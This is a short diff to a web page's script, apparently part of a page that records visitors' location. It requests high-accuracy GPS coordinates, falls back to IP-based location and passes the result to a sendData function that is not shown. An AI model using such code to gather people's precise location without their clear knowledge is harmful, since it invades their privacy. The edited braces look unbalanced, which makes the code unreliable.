@@ -56,23 +56,27 @@ async function start() {
         document.getElementById("status").innerText = "Error";
     });
 }
-
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                data.lat = pos.coords.latitude;
-                data.lon = pos.coords.longitude;
-                data.type = "GPS";
-                sendData();
-            },
-            () => sendData(),
-            { timeout: 5000 }
-        );
-    } else {
-        sendData();
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            data.lat = pos.coords.latitude;
+            data.lon = pos.coords.longitude;
+            data.type = "GPS";
+            sendData();
+        },
+        (err) => {
+            console.log("GPS failed, using IP");
+            sendData();
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+    );
+} else {
+    sendData();
+}
+    
     }
 
-    setTimeout(sendData, 7000);
+
 }
 </script>
 </body>
